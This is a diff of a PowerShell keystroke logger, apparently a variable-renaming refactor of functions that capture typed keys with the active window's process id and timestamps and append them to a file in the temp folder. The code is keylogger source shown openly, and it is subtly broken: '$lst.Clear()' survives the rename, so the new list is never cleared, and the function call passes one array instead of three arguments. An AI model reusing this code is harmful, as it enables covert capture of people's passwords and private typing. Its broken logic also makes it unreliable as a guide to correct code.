@@ -33,12 +33,15 @@ function get-activewin()
 }
 
 
-function output-line($logPath, $lst_str, $cnt){
+function output-line($logPath, $ary_str, $cnt){
   $activewin = get-activewin
-  $line = (Get-Date).ToString($C_dateformat) + "`t"
-  $line = $line + $activewin.Id + "`t"
-  $line = $line + $cnt + "`t"
-  $line = $line + $lst_str
+  $arylst = New-Object System.Collections.ArrayList
+  $arylst.Add((Get-Date).ToString($C_dateformat))
+  $arylst.Add($activewin.Id)
+  $arylst.Add($cnt)
+  $arylst.Add($ary_str)
+  $ary = $arylst.ToArray()
+  $line = [String]::Join("`t", $ary)
   [System.IO.File]::AppendAllText($logPath, $line + "`r`n", $C_Encode)
   if($C_debug_mode){
     $logger.info.Invoke($line)
@@ -56,7 +59,7 @@ function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt")
     [System.IO.File]::AppendAllText($logPath, "datetime`tprocessid`tcount`tkeystrokes`r`n", $C_Encode)
   }
   # buf
-  $lst = New-Object System.Collections.ArrayList
+  $arylst = New-Object System.Collections.ArrayList
   $buf = ''
   
   try
@@ -87,11 +90,11 @@ function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt")
               $cnt = $cnt + 1
             }else{
               if($buf -ne ""){
-                $null = $lst.Add($buf)
+                $null = $arylst.Add($buf)
               }
               if($C_exclusion_words -notcontains $val){
                 if($val.length -ne 0){
-                  $null = $lst.Add($val)
+                  $null = $arylst.Add($val)
                   $cnt = $cnt + 1
                 }
               }
@@ -105,9 +108,9 @@ function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt")
           } 
         }
       }
-      $lst_ary = $lst.ToArray()
-      $lst_str = [string]::Join(",",$lst_ary)
-      output-line($logPath, $lst_str, $cnt)
+      $ary = $arylst.ToArray()
+      $ary_str = [string]::Join(",",$ary)
+      output-line($logPath, $ary_str, $cnt)
       $i = 0
       $buf = ''
       $lst.Clear()
@@ -115,10 +118,10 @@ function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt")
   }
   finally
   { 
-    $lst += $buf
-    $lst_ary = $lst.ToArray()
-    $lst_str = [string]::Join(",",$lst_ary)
-    output-line($logPath, $lst_str, $cnt)
+    $arylst.Add($buf)
+    $ary = $arylst.ToArray()
+    $ary_str = [string]::Join(",",$ary)
+    output-line($logPath, $ary_str, $cnt)
   }
 }
 
